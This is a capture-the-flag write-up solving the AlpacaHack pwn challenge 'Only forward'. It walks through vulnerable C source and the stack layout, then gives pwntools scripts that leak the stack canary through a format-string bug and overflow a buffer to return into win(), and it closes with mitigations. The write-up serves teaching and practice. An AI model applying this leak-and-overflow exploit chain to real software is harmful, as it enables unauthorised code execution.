---
title: "Only forward: canary leak plus ret2win"
date: 2026-06-28 20:00:00 +0600
series: "AlpacaHack Daily"
platform: "AlpacaHack"
summary: "A format-string bug leaks the stack canary and an overflow returns into win() on a non-PIE binary."
description: "A format-string bug leaks the stack canary and an overflow returns into win() on a non-PIE binary."
tags: ["pwn"]
---

<details class="toc" markdown="1">
<summary>Contents</summary>

* TOC
{:toc}

</details>

{% raw %}
## TL;DR

`vuln()` has two bugs: a **format string bug** (`printf(name)`) used to leak the stack canary, and a **stack buffer overflow** (`read(0, buf, 256)` into a 64-byte buffer) used to overwrite the return address. The binary has **no PIE**, so `win()`'s address is a fixed constant - combining the leak with the overflow lets us jump straight into it and print the flag.

## 1. Source

```c
void win(void) {
    FILE *fp = fopen("flag.txt", "r");
    char flag[128];
    fgets(flag, sizeof(flag), fp);
    printf("Congratulations! %s\n", flag);
    exit(0);
}

void vuln(void) {
    char name[64];
    char buf[64];

    puts("What's your name?");
    read(0, name, 64);

    puts("Hello!");
    printf(name);          // BUG 1: format string
    puts("");

    puts("Tell me something:");
    read(0, buf, 256);      // BUG 2: overflow, buf is only 64 bytes

    puts("Bye!");
}
```

`win()` is unused by any normal path - the goal is to redirect execution into it.

## 2. Protections (`checksec`)

```
RELRO:      Partial RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
```

- **Canary present** → a raw overflow crashes unless the canary is known/restored - this is why the format string leak matters.
- **NX enabled** → no stack shellcode; not needed anyway (ret2win).
- **No PIE** → all addresses are fixed at compile time: `win = 0x4012a4`, `vuln = 0x401384`, `main = 0x401447`.

## 3. Stack layout

Disassembly of `vuln()`'s prologue/epilogue:

```asm
sub    rsp, 0x90
mov    rax, fs:0x28
mov    [rbp-0x8], rax     ; canary
...
lea    rax, [rbp-0x90]    ; &name
lea    rax, [rbp-0x50]    ; &buf
```

| Address      | Contents                 |
|--------------|--------------------------|
| `rbp - 0x90` | `name[0..64]`            |
| `rbp - 0x50` | `buf[0..64]`             |
| `rbp - 0x10` | 8 bytes padding          |
| `rbp - 0x08` | stack canary             |
| `rbp + 0x00` | saved `rbp`              |
| `rbp + 0x08` | saved return address     |

Overflowing `buf` reaches the canary after 72 bytes and the return address after 88 bytes.

## 4. Leaking the canary

```python
from pwn import *
io = remote('<host>', 34482)
io.recvuntil(b"name?")
payload = b"AAAAAAAA " + b" ".join(f"%{i}$p".encode() for i in range(1, 20))
#payload = b"AAAAAAAA " + b" ".join(f"%{i}$p".encode() for i in range(20, 40))
io.sendline(payload)
io.recvuntil(b"Hello!\n")
line = io.recvline()
print(line)
io.close()
```

`printf(name)` uses `name` as both the format string and a stack buffer, so `%N$p` dumps stack/register values. Probing confirmed `%6$p` == first 8 bytes of `name`, i.e. stack arg `n` maps to `name + 8*(n-6)`.

Byte offset from `name` to the canary: `(rbp-0x8) - (rbp-0x90) = 0x88` = 17 qwords → canary at position `6 + 17 = 23`.

Probe results confirmed it:

```
%23$p -> 0x294dc6bee2563100   <- ends in 0x00, canary signature
%25$p -> 0x40146c             <- return addr into main(), confirms offset math
```

(x86-64 Linux canaries always have a null low byte, to stop naive string leaks.)

## 5. Overflow payload

Sent into the second `read` (256-byte capacity):

```
64 bytes  filler for buf
 8 bytes  filler (padding before canary)
 8 bytes  leaked canary (restored exactly)
 8 bytes  filler (saved rbp, unchecked)
 8 bytes  win() address (0x4012a4) -> overwrites return address
```

## 6. Exploit

```python
from pwn import *

HOST, PORT = '127.0.0.1', 13337
WIN = 0x4012a4

io = remote(HOST, PORT)
io.recvuntil(b"name?")
io.sendline(b"%23$p")

io.recvuntil(b"Hello!\n")
canary = int(io.recvline().strip(), 16)
log.info(f"Leaked canary: {hex(canary)}")

io.recvuntil(b"something:")
payload  = b"A" * 64
payload += b"B" * 8
payload += p64(canary)
payload += b"C" * 8
payload += p64(WIN)
io.sendline(payload)

io.recvuntil(b"Bye!\n")
print(io.recvall(timeout=3).decode(errors='replace'))
```

## 7. Result

```
$ docker build -t only-forward .
$ docker run -d --rm -p 13337:1337 --name only-forward-test only-forward
$ python exploit.py
[*] Leaked canary: 0x85c2e5f5f3e81600
Congratulations! Alpaca{REDACTED}
```

(Canary differs per run - randomized per-process, so it's leaked fresh each connection.)

## 8. Mitigations

- Never pass user input as a format string - use `printf("%s", name)`.
- Bound the second `read()` to `sizeof(buf)`.
- Enable PIE - raises the bar even with a leak primitive already present.
- Canaries alone don't stop this: they protect against *blind* overflows, not overflows chained with an info leak.
{% endraw %}
